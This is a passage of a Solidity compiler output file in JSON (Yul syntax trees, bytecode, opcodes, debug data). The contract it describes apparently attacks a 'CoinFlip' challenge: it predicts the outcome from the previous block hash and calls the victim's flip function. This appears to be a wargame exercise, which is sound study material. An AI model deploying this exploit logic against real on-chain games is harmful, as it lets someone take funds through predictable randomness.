																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "827:5:3"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "800:26:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "800:33:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "800:33:3"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "737:6:3",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "745:3:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "753:5:3",
														"type": ""
													}
												],
												"src": "696:143:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "922:274:3",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "968:83:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "970:77:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "970:79:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "970:79:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "943:7:3"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "952:9:3"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "939:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "939:23:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "964:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "935:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "935:32:3"
															},
															"nodeType": "YulIf",
															"src": "932:119:3"
														},
														{
															"nodeType": "YulBlock",
															"src": "1061:128:3",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "1076:15:3",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1090:1:3",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "1080:6:3",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "1105:74:3",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "1151:9:3"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "1162:6:3"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "1147:3:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1147:22:3"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1171:7:3"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "1115:31:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1115:64:3"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "1105:6:3"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "892:9:3",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "903:7:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "915:6:3",
														"type": ""
													}
												],
												"src": "845:351:3"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 3,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060015534801561003457600080fd5b506040516104e83803806104e8833981810160405281019061005691906100ff565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061012c565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100cc826100a1565b9050919050565b6100dc816100c1565b81146100e757600080fd5b50565b6000815190506100f9816100d3565b92915050565b6000602082840312156101155761011461009c565b5b6000610123848285016100ea565b91505092915050565b6103ad8061013b6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063cde4efa91461003b578063f32d251d14610059575b600080fd5b610043610077565b6040516100509190610197565b60405180910390f35b610061610158565b60405161006e9190610231565b60405180910390f35b6000806001436100879190610285565b4060001c905060006001548261009d91906102e8565b90506000600182146100b05760006100b3565b60015b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b815260040161010e9190610197565b6020604051808303816000875af115801561012d573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610151919061034a565b5050505090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008115159050919050565b6101918161017c565b82525050565b60006020820190506101ac6000830184610188565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006101f76101f26101ed846101b2565b6101d2565b6101b2565b9050919050565b6000610209826101dc565b9050919050565b600061021b826101fe565b9050919050565b61022b81610210565b82525050565b60006020820190506102466000830184610222565b92915050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006102908261024c565b915061029b8361024c565b9250828210156102ae576102ad610256565b5b828203905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b60006102f38261024c565b91506102fe8361024c565b92508261030e5761030d6102b9565b5b828204905092915050565b600080fd5b6103278161017c565b811461033257600080fd5b50565b6000815190506103448161031e565b92915050565b6000602082840312156103605761035f610319565b5b600061036e84828501610335565b9150509291505056fea264697066735822122039d2d98d2861fc83dd1aa347fa18de004eef61ad0f0045ac36d173753f00f16c64736f6c634300080f0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4E8 CODESIZE SUB DUP1 PUSH2 0x4E8 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x56 SWAP2 SWAP1 PUSH2 0xFF JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x12C JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xCC DUP3 PUSH2 0xA1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xDC DUP2 PUSH2 0xC1 JUMP JUMPDEST DUP2 EQ PUSH2 0xE7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xF9 DUP2 PUSH2 0xD3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x115 JUMPI PUSH2 0x114 PUSH2 0x9C JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x123 DUP5 DUP3 DUP6 ADD PUSH2 0xEA JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3AD DUP1 PUSH2 0x13B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCDE4EFA9 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xF32D251D EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x77 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x197 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x61 PUSH2 0x158 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x231 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x87 SWAP2 SWAP1 PUSH2 0x285 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 PUSH1 0x1 SLOAD DUP3 PUSH2 0x9D SWAP2 SWAP1 PUSH2 0x2E8 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xB0 JUMPI PUSH1 0x0 PUSH2 0xB3 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x10E SWAP2 SWAP1 PUSH2 0x197 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x12D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x151 SWAP2 SWAP1 PUSH2 0x34A JUMP JUMPDEST POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x191 DUP2 PUSH2 0x17C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1AC PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x188 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F7 PUSH2 0x1F2 PUSH2 0x1ED DUP5 PUSH2 0x1B2 JUMP JUMPDEST PUSH2 0x1D2 JUMP JUMPDEST PUSH2 0x1B2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x209 DUP3 PUSH2 0x1DC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x21B DUP3 PUSH2 0x1FE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x22B DUP2 PUSH2 0x210 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x246 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x222 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x290 DUP3 PUSH2 0x24C JUMP JUMPDEST SWAP2 POP PUSH2 0x29B DUP4 PUSH2 0x24C JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x2AE JUMPI PUSH2 0x2AD PUSH2 0x256 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x2F3 DUP3 PUSH2 0x24C JUMP JUMPDEST SWAP2 POP PUSH2 0x2FE DUP4 PUSH2 0x24C JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x30E JUMPI PUSH2 0x30D PUSH2 0x2B9 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x327 DUP2 PUSH2 0x17C JUMP JUMPDEST DUP2 EQ PUSH2 0x332 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x344 DUP2 PUSH2 0x31E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x360 JUMPI PUSH2 0x35F PUSH2 0x319 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x36E DUP5 DUP3 DUP6 ADD PUSH2 0x335 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CODECOPY 0xD2 0xD9 DUP14 0x28 PUSH2 0xFC83 0xDD BYTE LOG3 SELFBALANCE STATICCALL XOR 0xDE STOP 0x4E 0xEF PUSH2 0xAD0F STOP GASLIMIT 0xAC CALLDATASIZE 0xD1 PUSH20 0x753F00F16C64736F6C634300080F003300000000 ",
							"sourceMap": "167:544:1:-:0;;;250:77;233:94;;334:113;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;418:22;392:14;;:49;;;;;;;;;;;;;;;;;;334:113;167:544;;88:117:3;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;167:544:1:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@flip_151": {
									"entryPoint": 119,
									"id": 151,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@victimContract_94": {
									"entryPoint": 344,
									"id": 94,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_decode_t_bool_fromMemory": {
									"entryPoint": 821,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_bool_fromMemory": {
									"entryPoint": 842,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 392,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_contract$_CoinFlip_$87_to_t_address_fromStack": {
									"entryPoint": 546,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": 407,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_contract$_CoinFlip_$87__to_t_address__fromStack_reversed": {
									"entryPoint": 561,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 744,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 645,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 380,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 434,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 588,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"convert_t_contract$_CoinFlip_$87_to_t_address": {
									"entryPoint": 528,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"convert_t_uint160_to_t_address": {
									"entryPoint": 510,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"convert_t_uint160_to_t_uint160": {
									"entryPoint": 476,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"identity": {
									"entryPoint": 466,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"panic_error_0x11": {
									"entryPoint": 598,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 697,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 793,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 798,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:3267:3",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "49:48:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "59:32:3",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "84:5:3"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "77:6:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "77:13:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "70:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "70:21:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "59:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "31:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "41:7:3",
														"type": ""
													}
												],
												"src": "7:90:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "162:50:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "179:3:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "199:5:3"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "184:14:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "184:21:3"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "172:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "172:34:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "172:34:3"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "150:5:3",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "157:3:3",
														"type": ""
													}
												],
												"src": "103:109:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "310:118:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "320:26:3",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "332:9:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "343:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "328:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "328:18:3"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "320:4:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "394:6:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "407:9:3"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "418:1:3",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "403:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "403:17:3"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "356:37:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "356:65:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "356:65:3"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "282:9:3",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "294:6:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "305:4:3",
														"type": ""
													}
												],
												"src": "218:210:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "479:81:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "489:65:3",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "504:5:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "511:42:3",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "500:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "500:54:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "489:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "461:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "471:7:3",
														"type": ""
													}
												],
												"src": "434:126:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "598:28:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "608:12:3",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "615:5:3"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "608:3:3"
																}
															]
														}
													]
												},
												"name": "identity",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "584:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nodeType": "YulTypedName",
														"src": "594:3:3",
														"type": ""
													}
												],
												"src": "566:60:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "692:82:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "702:66:3",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "760:5:3"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_uint160",
																					"nodeType": "YulIdentifier",
																					"src": "742:17:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "742:24:3"
																			}
																		],
																		"functionName": {
																			"name": "identity",
																			"nodeType": "YulIdentifier",
																			"src": "733:8:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "733:34:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "715:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "715:53:3"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nodeType": "YulIdentifier",
																	"src": "702:9:3"
																}
															]
														}
													]
												},
												"name": "convert_t_uint160_to_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "672:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nodeType": "YulTypedName",
														"src": "682:9:3",
														"type": ""
													}
												],
												"src": "632:142:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "840:66:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "850:50:3",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "894:5:3"
																	}
																],
																"functionName": {
																	"name": "convert_t_uint160_to_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "863:30:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "863:37:3"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nodeType": "YulIdentifier",
																	"src": "850:9:3"
																}
															]
														}
													]
												},
												"name": "convert_t_uint160_to_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
